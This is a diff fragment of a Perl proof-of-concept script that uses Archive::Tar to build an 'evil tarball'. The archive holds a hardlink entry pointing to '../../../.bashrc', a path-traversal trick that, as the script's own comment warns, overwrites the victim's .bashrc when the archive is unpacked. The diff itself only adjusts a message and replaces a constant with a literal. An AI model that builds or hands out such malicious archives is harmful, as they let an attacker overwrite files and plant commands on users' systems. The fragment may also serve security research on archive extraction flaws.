@@ -3,14 +3,14 @@
 
 banner();
 
-eval { require Archive::Tar; } or die "Need to have Archive::Tar installed.";
+eval { require Archive::Tar; } or die "[-] Need to have Archive::Tar installed.";
 
 print "[*] Creating evil tarball ...\n";
 
 my $tar = Archive::Tar->new();
 
 # WARNING: This will overwrite your .bashrc when you unpack it
-my %h1 = (linkname => "../../../.bashrc", type => Archive::Tar::Constant::HARDLINK );
+my %h1 = (linkname => "../../../.bashrc", type => 1);	# Archive::Tar::Constant::HARDLINK
 
 $tar->add_data('file1.txt', '', \%h1);
 $tar->add_data('file2.txt', 'INNOCENT DATA');
